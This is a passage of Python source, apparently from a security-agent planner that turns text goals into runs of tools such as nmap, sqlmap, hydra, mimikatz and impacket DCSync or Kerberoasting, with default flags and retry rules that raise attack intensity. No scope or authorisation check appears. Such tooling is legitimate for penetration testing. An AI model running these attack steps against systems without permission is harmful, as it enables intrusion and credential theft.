        asn_match = re.search(r"\bAS\d+\b", goal)
        target = ""
        if url_match:
            target = url_match.group(0)
        elif host_match:
            target = host_match.group(0)
        elif ip_match:
            target = ip_match.group(0)
        elif asn_match:
            target = asn_match.group(0)

        # ASN shortcut
        if asn_match:
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": "ASN ownership lookup",
                        "tool": "whois",
                        "args": {"target": target},
                    }
                ],
            )

        # Step 0.5: Direct tool keyword match
        direct_tool_keywords = {
            "nmap": ("nmap", "Nmap network scanner", "-sT -T4 --top-ports 100"),
            "masscan": ("masscan", "Mass port scanner", ""),
            "whatweb": ("whatweb", "Web technology fingerprinting", ""),
            "gobuster": ("gobuster", "Directory/file brute force", ""),
            "ffuf": ("ffuf", "Web fuzzer", ""),
            "curl": ("curl", "HTTP/S request tool", "-sIL"),
            "dig": ("dig", "DNS lookup utility", ""),
            "whois": ("whois", "WHOIS lookup", ""),
            "ping": ("ping", "ICMP ping connectivity test", "-c 4"),
            "nuclei": ("nuclei", "Template-based vulnerability scanner", ""),
            "nikto": ("nikto", "Web server vulnerability scanner", ""),
            "wpscan": ("wpscan", "WordPress vulnerability scanner", ""),
            "subfinder": ("subfinder", "Passive subdomain enumeration", ""),
            "amass": ("amass", "Aggressive subdomain discovery", ""),
            "gau": ("gau", "GetAllUrls from Wayback Machine", ""),
            "httpx": ("httpx", "HTTP endpoint probing", ""),
            "katana": ("katana", "Web crawler and URL discovery", ""),
            "gospider": ("gospider", "Web spider and content discovery", ""),
            "arjun": ("arjun", "HTTP parameter discovery", ""),
            "paramspider": ("paramspider", "Parameter mining from URLs", ""),
            "theharvester": ("theHarvester", "Email/subdomain OSINT harvesting", ""),
            "the harvester": ("theHarvester", "Email/subdomain OSINT harvesting", ""),
            "shodan": ("shodan", "Shodan internet device search", "search"),
            "censys": ("censys", "Censys certificate/device search", ""),
            "uncover": ("uncover", "Shodan/Censys search via CLI", ""),
            "subjack": ("subjack", "Subdomain takeover detection", ""),
            "subdomain": ("subfinder", "Subdomain enumeration", ""),
            "port scan": ("nmap", "Port scan", "-sT -T4 --top-ports 100"),
            "directory": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
            "takeover": ("subjack", "Subdomain takeover detection", ""),
            "holehe": ("holehe", "Email-to-account mapping", ""),
            "sherlock": ("sherlock", "Username search across social networks", ""),
            "waybackurls": ("waybackurls", "Wayback Machine URL discovery", ""),
            "puredns": ("puredns", "DNS brute-force with wildcard filtering", ""),
            "ssl": ("openssl", "SSL/TLS certificate inspection", "s_client -connect {target}:443"),
            "alive": ("httpx", "HTTP live host probing", "-status-code -title -tech-detect"),
            "parameter": ("arjun", "HTTP parameter discovery", ""),
            "parameters": ("arjun", "HTTP parameter discovery", ""),
            "cloud_enum": ("cloud_enum", "Cloud storage enumeration", ""),
            "scoutsuite": ("scoutsuite", "Multi-cloud security auditing", ""),
            "prowler": ("prowler", "AWS security auditing", ""),
            "gitleaks": ("gitleaks", "Git repository secret scanning", ""),
            "trufflehog": ("trufflehog", "Git secret scanning", ""),
            "maigret": ("maigret", "Username search engine", ""),
            "dirb": ("dirb", "Directory brute force tool", ""),
            "dirsearch": ("dirsearch", "Web path discovery tool", ""),
            "rustscan": ("rustscan", "Fast port scanner", ""),
            "naabu": ("naabu", "Fast port scanner", ""),
            "interactsh": ("interactsh", "OOB interaction testing client", "-c"),
            "ssllabs": ("ssllabs-scan", "SSL Labs API scanner", ""),
            "testssl": ("testssl.sh", "SSL/TLS comprehensive testing", "--full"),
            "dnsx": ("dnsx", "DNS toolkit and probing", ""),
            "massdns": ("massdns", "High-speed DNS brute-force resolver", ""),
            "impacket": ("impacket", "Impacket toolkit", ""),
            "responder": ("responder", "LLMNR/NBT-NS responder", "-I eth0"),
            "searchsploit": ("searchsploit", "Exploit search", ""),
            "bloodhound": ("bloodhound-python", "BloodHound AD collector", ""),
            "sqlmap": ("sqlmap", "SQL injection scan", "--batch --random-agent"),
            "sublist3r": ("sublist3r", "Subdomain search via Sublist3r", ""),
            "assetfinder": ("assetfinder", "Asset discovery via public sources", ""),
            "crtsh": (
                "curl",
                "Certificate transparency via crt.sh",
                "-s https://crt.sh/?q=%25.{target}&output=json",
            ),
            "crt.sh": (
                "curl",
                "Certificate transparency via crt.sh",
                "-s https://crt.sh/?q=%25.{target}&output=json",
            ),
            "hydra": ("hydra", "Brute force authentication", ""),
            "hashcat": ("hashcat", "Hash cracking tool", ""),
            "openssl": (
                "openssl",
                "SSL/TLS certificate inspection",
                "s_client -connect {target}:443",
            ),
            "wayback": ("waybackurls", "Wayback Machine URL discovery", ""),
            "bucket": ("curl", "Cloud storage bucket check", "-sI"),
            "buckets": ("curl", "Cloud storage bucket check", "-sI"),
            # ── Blue Team / Defensive tools ────────────────────────────
            "journalctl": ("journalctl", "Linux system log analysis", "-u"),
            "wevtutil": ("wevtutil", "Windows Event Log management", "qe Security"),
            "tcpdump": ("tcpdump", "Network packet capture", "-i eth0 -w capture.pcap"),
            "tshark": ("tshark", "Packet capture analysis", "-r"),
            "zeek": ("zeek", "Network security monitoring", ""),
            "suricata": ("suricata", "IDS/IPS engine", "-c /etc/suricata/suricata.yaml"),
            "snort": ("snort", "Network intrusion detection", "-q -A console"),
            "yara": ("yara", "Malware pattern matching", ""),
            "sigmac": ("sigmac", "Sigma rule converter", ""),
            "volatility": ("volatility", "Memory forensics framework", "-f"),
            "autopsy": ("autopsy", "Digital forensics platform", ""),
            "sleuthkit": ("sleuthkit", "Forensic analysis toolkit", ""),
            "ghidra": ("ghidra", "Reverse engineering framework", ""),
            "radare2": ("radare2", "Reverse engineering toolkit", ""),
            "objdump": ("objdump", "Binary disassembly and analysis", "-d"),
            "lynis": ("lynis", "Security auditing tool", "audit system"),
            "openscap": ("openscap", "Compliance and vulnerability scanning", "oval eval"),
            "aide": ("aide", "File integrity monitoring", "--check"),
            "tripwire": ("tripwire", "File integrity checking", "--check"),
            "chkrootkit": ("chkrootkit", "Rootkit detection scanner", "-q"),
            "rkhunter": ("rkhunter", "Rootkit hunter scanner", "--check"),
            "osquery": ("osquery", "Endpoint querying via SQL", ""),
            "clamav": ("clamav", "Antivirus scanning engine", ""),
            "cape": ("cape", "Malware sandbox analysis", ""),
            "pestudio": ("pestudio", "PE file analysis tool", ""),
            "cryptsetup": ("cryptsetup", "Disk encryption management", "luksStatus"),
            "lsmod": ("lsmod", "List loaded kernel modules", ""),
            "secedit": ("secedit", "Windows security policy editor", "/export"),
            "Get-WinEvent": ("wevtutil", "Windows Event Log query via PowerShell", ""),
            "schtasks": ("schtasks", "Windows scheduled task management", "/query"),
            "netstat": ("netstat", "Network connection listing", "-ano"),
            "iptables": ("iptables", "Firewall rule management", "-L -n -v"),
            "strings": ("strings", "Extract strings from binary files", ""),
            "tail": ("tail", "Real-time log tailing", "-f"),
            "sc": ("sc", "Windows service control manager", "query"),
            "reg": ("reg", "Windows registry management", "query"),
            "misp": ("curl", "MISP threat intelligence platform", ""),
            # ── Forensics (additional entries for lightweight matching) ─
            "exiftool": ("exiftool", "Metadata extraction from files", ""),
            "pypykatz": ("pypykatz", "Credential extraction from memory dumps", ""),
            "mimikatz": ("mimikatz", "Windows credential extraction tool", ""),
            "foremost": ("foremost", "File carving and data recovery", ""),
            "binwalk": ("binwalk", "Firmware analysis and extraction", ""),
            "bulk_extractor": ("bulk_extractor", "Digital forensics evidence extraction", ""),
            # ── SAST / Code Analysis ────────────────────────────────────
            "semgrep": ("semgrep", "Static code security analysis", "--config=auto"),
            "bandit": ("bandit", "Python security linter", "-r"),
            # ── Container Security ──────────────────────────────────────
            "trivy": ("trivy", "Container image vulnerability scanner", "image --no-progress"),
            "grype": ("grype", "Vulnerability scanner for containers", ""),
            "syft": ("syft", "SBOM generation tool", ""),
            # ── Cloud Security (additional) ─────────────────────────────
            "checkov": ("checkov", "IaC security scanner", "-d ."),
            "kubectl": ("kubectl", "Kubernetes CLI", "get pods"),
            "kube-hunter": ("kube-hunter", "Kubernetes security scanner", "--quick"),
            # ── Reverse Engineering (additional) ────────────────────────
            "apktool": ("apktool", "Android APK decompilation tool", "d"),
            # ── Network / AD (additional) ───────────────────────────────
            "crackmapexec": ("crackmapexec", "AD/Windows post-exploitation toolkit", ""),
            "smbmap": ("smbmap", "SMB share enumeration", ""),
            "enum4linux": ("enum4linux", "Windows/Samba enumeration tool", ""),
            "kerberoast": ("impacket-GetUserSPNs", "Kerberoasting attack", ""),
            "asrep": ("impacket-GetNPUsers", "AS-REP roasting attack", ""),
            "dcsync": ("impacket-secretsdump", "DCSync attack", ""),
        }
        words = goal_lower.split()
        # Check for "with {tool}" / "using {tool}" pattern for preference boost
        with_phrase = re.search(r"\b(?:with|using|via)\s+(\w+)", goal_lower)
        prefer_tool = with_phrase.group(1) if with_phrase else None
        best_kw: str | None = None
        best_pos = -1
        best_tool: str | None = None
        best_desc: str | None = None
        best_flags: str | None = None
        for kw, (tool, desc, flags) in direct_tool_keywords.items():
            if kw in words:
                pos = words.index(kw)
                if prefer_tool and kw == prefer_tool:
                    pos = max(0, pos - 10)
                if best_pos < 0:
                    best_pos = pos
                    best_kw = kw
                    best_tool = tool
                    best_desc = desc
                    best_flags = flags
                elif pos < best_pos:
                    best_pos = pos
                    best_kw = kw
                    best_tool = tool
                    best_desc = desc
                    best_flags = flags
        if best_kw:
            actual_tool = str(best_tool)
            if best_tool not in avail_set and best_tool in TOOL_ALTERNATIVES:
                for alt in TOOL_ALTERNATIVES[best_tool]:
                    if alt in avail_set:
                        actual_tool = alt
                        break
            count_m = re.search(r"\bfor\s+(\d+)\s+time", goal_lower)
            if count_m and actual_tool == "ping":
                best_flags = f"-c {count_m.group(1)}"
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": best_desc,
                        "tool": actual_tool,
                        "args": {"target": target, "flags": best_flags},
                    }
                ],
            )

        # Step 2b: Multi-word keyword fallback (shared list)
        for kw, tool, desc, flags in _MULTI_WORD_CHECKS:
            if kw in goal_lower:
                actual_tool = tool
                if tool not in avail_set and tool in TOOL_ALTERNATIVES:
                    for alt in TOOL_ALTERNATIVES[tool]:
                        if alt in avail_set:
                            actual_tool = alt
                            break
                return self.create_plan(
                    goal=goal,
                    steps=[
                        {
                            "description": desc,
                            "tool": actual_tool,
                            "args": {"target": target, "flags": flags},
                        }
                    ],
                )

        # Step 3: Availability-weighted index search
        tool_match = None
        if available_tools:
            if self._keyword_index:
                candidates = self._search_index(goal)
                for c in candidates:
                    if c in avail_set:
                        pattern = r"(?<!\w)" + re.escape(c.lower()) + r"(?!\w)"
                        if re.search(pattern, goal_lower):
                            tool_match = c
                            break
            if not tool_match:
                for t in available_tools:
                    if len(t) < 3:
                        continue
                    pattern = r"(?<!\w)" + re.escape(t.lower()) + r"(?!\w)"
                    if re.search(pattern, goal_lower):
                        tool_match = t
                        break
        if tool_match:
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": f"Execute {tool_match} on {target}",
                        "tool": tool_match,
                        "args": {
                            "target": target,
                            "flags": "-sT -T4 --top-ports 100" if tool_match == "nmap" else "",
                        },
                    }
                ],
            )

        # Step 4a: Intent-based tool selection (without target)
        no_target_intent_map = {
            "email": ("theHarvester", "Email OSINT harvesting", "-b all"),
            "emails": ("theHarvester", "Email OSINT harvesting", "-b all"),
            "urls": ("gau", "URL discovery from Wayback Machine", ""),
            "url": ("gau", "URL discovery from Wayback Machine", ""),
            "subdomain": ("subfinder", "Subdomain enumeration", ""),
            "subdomains": ("subfinder", "Subdomain enumeration", ""),
            "vulnerabilities": ("nuclei", "Vulnerability scan", "-t http"),
            "vuln": ("nuclei", "Vulnerability scan", "-t http"),
            "parameter": ("arjun", "HTTP parameter discovery", ""),
            "parameters": ("arjun", "HTTP parameter discovery", ""),
            "ssl": ("openssl", "SSL/TLS certificate inspection", ""),
            "dns": ("dig", "DNS enumeration", ""),
            "tech": ("whatweb", "Technology fingerprinting", ""),
            "framework": ("whatweb", "Technology fingerprinting", ""),
            "cms": ("whatweb", "CMS fingerprinting", ""),
            "wp": ("wpscan", "WordPress vulnerability scan", ""),
            "wordpress": ("wpscan", "WordPress vulnerability scan", ""),
            "fuzz": ("ffuf", "Directory fuzzing", f"-w {_COMMON_WORDLIST}"),
            "directories": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
            "cve": ("nuclei", "CVE scan", "-t http/cves"),
            "xss": ("nuclei", "XSS scan", "-t http/xss"),
            "sqli": ("sqlmap", "SQL injection scan", "--batch --random-agent"),
            "sql": ("sqlmap", "SQL injection scan", "--batch --random-agent"),
            "smb": ("nmap", "SMB enumeration", "--script smb-*"),
            "whois": ("whois", "WHOIS lookup", ""),
            "ping": ("ping", "ICMP ping connectivity test", "-c 4"),
            "header": ("curl", "HTTP headers check", "-sIL"),
            "headers": ("curl", "HTTP headers check", "-sIL"),
            "cloud": ("curl", "Cloud asset check", "-sI"),
            "bucket": ("curl", "Cloud storage bucket check", "-sI"),
            "buckets": ("curl", "Cloud storage bucket check", "-sI"),
        }
        GENERIC_NO_TARGET = frozenset(
            {"scan", "run", "do", "get", "find", "check", "test", "list", "show"}
        )
        best_score = -999999
        matched_keyword = None
        for keyword in no_target_intent_map:
            if keyword not in goal_lower:
                continue
            pos = goal_lower.index(keyword)
            word_starts_at_boundary = pos == 0 or not goal_lower[pos - 1].isalnum()
            if not word_starts_at_boundary:
                continue
            is_complete_word = (
                pos + len(keyword) >= len(goal_lower)
                or not goal_lower[pos + len(keyword)].isalnum()
            )
            score = 10000
            score += 5000 if is_complete_word else 0
            score += max(0, 500 - pos) * 20
            score += len(keyword) * 3
            if keyword in GENERIC_NO_TARGET:
                score -= 50000
            tool_name = no_target_intent_map[keyword][0]
            if tool_name in goal_lower.split():
                score += 50000
            if score > best_score:
                best_score = score
                matched_keyword = keyword
        if matched_keyword:
            tool, desc, flags = no_target_intent_map[matched_keyword]
            actual_tool = tool
            if tool not in avail_set and tool in TOOL_ALTERNATIVES:
                for alt in TOOL_ALTERNATIVES[tool]:
                    if alt in avail_set:
                        actual_tool = alt
                        break
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": desc,
                        "tool": actual_tool,
                        "args": {"target": target, "flags": flags},
                    }
                ],
            )

        # Step 4b: Intent-based tool selection (with target)
        if target:
            intent_map = {
                "ping": ("ping", "ICMP ping connectivity test", "-c 4"),
                "subdomain": ("subfinder", "Subdomain enumeration", ""),
                "subdomains": ("subfinder", "Subdomain enumeration", ""),
                "port": ("nmap", "Port scan", "-sT -T4 --top-ports 100"),
                "ports": ("nmap", "Port scan", "-sT -T4 --top-ports 100"),
                "directory": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
                "directories": ("gobuster", "Directory enumeration", f"dir -w {_COMMON_WORDLIST}"),
                "dns": ("dig", "DNS enumeration", ""),
                "whois": ("whois", "WHOIS lookup", ""),
                "tech": ("whatweb", "Technology fingerprinting", ""),
                "header": ("curl", "HTTP headers check", "-sIL"),
                "headers": ("curl", "HTTP headers check", "-sIL"),
                "vuln": ("nuclei", "Vulnerability scan", "-t http"),
                "web": ("whatweb", "Web technology fingerprinting", ""),
                "takeover": ("subjack", "Subdomain takeover detection", ""),
                "ssl": (
                    "openssl",
                    "SSL/TLS certificate inspection",
                    "s_client -connect {target}:443",
                ),
                "parameter": ("arjun", "HTTP parameter discovery", ""),
                "parameters": ("arjun", "HTTP parameter discovery", ""),
                "alive": ("httpx", "HTTP live host probing", "-status-code -title -tech-detect"),
                "bucket": ("curl", "Cloud storage bucket check", "-sI"),
                "buckets": ("curl", "Cloud storage bucket check", "-sI"),
                "ct log": (
                    "curl",
                    "Certificate transparency log search",
                    "-s https://crt.sh/?q=%25.{target}&output=json",
                ),
                "subdomains takeover": ("subjack", "Subdomain takeover detection", ""),
                "cloud": ("curl", "Cloud asset check", "-sI"),
                "urls": ("gau", "URL discovery from Wayback Machine", ""),
                "url": ("gau", "URL discovery from Wayback Machine", ""),
            }
            GENERIC_KEYWORDS = frozenset(
                {
                    "scan",
                    "run",
                    "do",
                    "get",
                    "find",
                    "check",
                    "test",
                    "list",
                    "show",
                    "explore",
                    "discover",
                    "probe",
                    "http",
                    "url",
                }
            )
            best_score = -999999
            matched_keyword = None
            for keyword in intent_map:
                if keyword not in goal_lower:
                    continue
                pos = goal_lower.index(keyword)
                word_starts_at_boundary = pos == 0 or not goal_lower[pos - 1].isalnum()
                if not word_starts_at_boundary:
                    continue
                is_complete_word = (
                    pos + len(keyword) >= len(goal_lower)
                    or not goal_lower[pos + len(keyword)].isalnum()
                )
                score = 10000
                score += 5000 if is_complete_word else 0
                score += max(0, 500 - pos) * 20
                score += len(keyword) * 3
                if keyword in GENERIC_KEYWORDS:
                    score -= 50000
                tool_name = intent_map[keyword][0]
                if tool_name in goal_lower.split():
                    score += 50000
                if score > best_score:
                    best_score = score
                    matched_keyword = keyword
            if matched_keyword:
                tool, desc, flags = intent_map[matched_keyword]
                actual_tool = tool
                if tool not in avail_set and tool in TOOL_ALTERNATIVES:
                    for alt in TOOL_ALTERNATIVES[tool]:
                        if alt in avail_set:
                            actual_tool = alt
                            break
                clean_target = target.replace("https://", "").replace("http://", "").split("/")[0]
                return self.create_plan(
                    goal=goal,
                    steps=[
                        {
                            "description": desc
                            + (f" (via {actual_tool})" if actual_tool != tool else ""),
                            "tool": actual_tool,
                            "args": {"target": clean_target, "flags": flags},
                        }
                    ],
                )

        # Fallback: single nmap port scan if target present
        if target:
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": "Port scan",
                        "tool": "nmap",
                        "args": {"target": target, "flags": "-sT -T4 --top-ports 100"},
                    }
                ],
            )

        # If no target but has action keywords, return generic probe
        goal_keywords = {
            "scan",
            "recon",
            "audit",
            "check",
            "enum",
            "enumerate",
            "analyze",
            "analyse",
            "explore",
            "map",
            "discover",
            "probe",
            "test",
            "hack",
            "pentest",
        }
        if any(kw in goal_lower.split() for kw in goal_keywords):
            return self.create_plan(
                goal=goal,
                steps=[
                    {"description": "Technology fingerprinting", "tool": "whatweb", "args": {}},
                    {
                        "description": "Port scan",
                        "tool": "nmap",
                        "args": {"flags": "-sT -T4 --top-ports 100"},
                    },
                ],
            )
        return self.create_plan(goal=goal)

    def adapt_plan(self, plan: ExecutionPlan, failed_step: PlanStep, error: str) -> ExecutionPlan:
        error_lower = error.lower()
        RECOVERY_RULES: list[tuple[str | None, str, Any]] = [
            (
                "nmap",
                "filtered",
                lambda s: s.args.update({"flags": s.args.get("flags", "") + " -Pn"}),
            ),
            (
                "nmap",
                "permission",
                lambda s: s.args.update({"flags": s.args.get("flags", "").replace("-sS", "-sT")}),
            ),
            (None, "timeout", lambda s: s.args.update({"timeout": s.timeout * 1.5})),
            (
                "gobuster|ffuf",
                "404",
                lambda s: s.args.update({"extensions": "php,html,js,txt,asp,aspx"}),
            ),
            ("hydra", "invalid user", lambda s: s.args.update({"flags": "-e nsr"})),
            ("sqlmap", "not injectable", lambda s: s.args.update({"flags": "--level=3 --risk=2"})),
        ]
        for tool_pat, err_pat, recovery_fn in RECOVERY_RULES:
            tool_match = tool_pat is None or re.search(tool_pat, failed_step.tool)
            if tool_match and err_pat in error_lower:
                if failed_step.can_retry:
                    recovery_fn(failed_step)
                    failed_step.status = StepStatus.PENDING
                    failed_step.retry_count += 1
                    return plan
        if "refused" in error_lower:
            failed_step.status = StepStatus.SKIPPED
            plan.steps.append(
                PlanStep(
                    tool="nuclei",
                    args={"target": failed_step.args.get("target", "")},
                )
            )
            return plan
        if failed_step.can_retry:
            failed_step.status = StepStatus.PENDING
            failed_step.retry_count += 1
        else:
            failed_step.status = StepStatus.FAILED
        return plan

    def get_plan(self, plan_id: str) -> ExecutionPlan | None:
        return self._plans.get(plan_id)

    def list_plans(self, status: PlanStatus | None = None) -> list[ExecutionPlan]:
        plans = list(self._plans.values())
        if status:
            plans = [p for p in plans if p.status == status]
        return sorted(plans, key=lambda p: -p.created_at)

    def stats(self) -> dict[str, Any]:
        plans = list(self._plans.values())
        return {
            "total_plans": len(plans),
            "active": len([p for p in plans if p.status == PlanStatus.ACTIVE]),
            "completed": len([p for p in plans if p.status == PlanStatus.COMPLETED]),
            "templates": list(self._templates.keys()),
        }


__all__ = [
    "TOOL_ALTERNATIVES",
    "RegistryPlanner",
]
